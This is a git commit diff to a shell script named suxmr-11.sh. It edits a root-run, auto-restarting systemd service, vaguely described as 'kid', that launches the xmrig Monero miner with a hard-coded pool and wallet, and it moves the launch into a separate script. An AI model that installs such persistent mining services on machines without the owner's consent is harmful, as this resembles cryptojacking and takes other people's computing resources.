e6ac1ee2922a235a3cdc3d606709752e36a261a2
waniekvbgm <69979619+waniekvbgm@users.noreply.github.com>
2020-10-14 07:03:30 +0700

    Update suxmr-11.sh

--- suxmr-11.sh
+++ suxmr-11.sh
@@ -13,7 +13,7 @@ Description=kid
 After=network.target
 [Service]
 Type=forking
-ExecStart=/bin/sh -c 'cd /usr/local/src/xmrig/build/ && ./xmrig --coin=monero -B -R 10 -o stratum+tcp://pool.supportxmr.com:5555 -u 49sRqfo27yudukYia9K4bobaeDMmq2iHkDtUwMQ1WgFHAHcfad5dqMoFTPcAZ6XPudUz3rZoWdce2TpXHfdzv7vbHjB2XSP -p x -k'
+ExecStart=/usr/local/src/suxmr-11-link1.sh
 Restart=on-failure
 RestartSec=60
 User=root
